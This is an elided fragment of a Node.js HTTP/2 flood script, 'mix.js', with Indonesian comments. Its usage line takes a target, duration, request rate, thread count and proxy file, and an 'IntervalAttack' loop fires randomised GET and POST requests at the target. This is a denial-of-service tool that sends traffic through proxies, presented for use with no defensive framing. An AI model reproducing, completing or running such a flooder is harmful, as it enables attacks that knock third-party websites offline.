...
if (process.argv.length < 7) {
    console.log(`
Usage: node mix.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]`);
    process.exit();
}
...
const methods = ["GET", "POST"]; // Daftar metode yang akan digunakan
        ...
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    // Memilih metode secara acak dari daftar metode
                    const randomMethod = methods[Math.floor(Math.random() * methods.length)];

                    const requestHeaders = Object.assign({}, headers, { ":method": randomMethod });
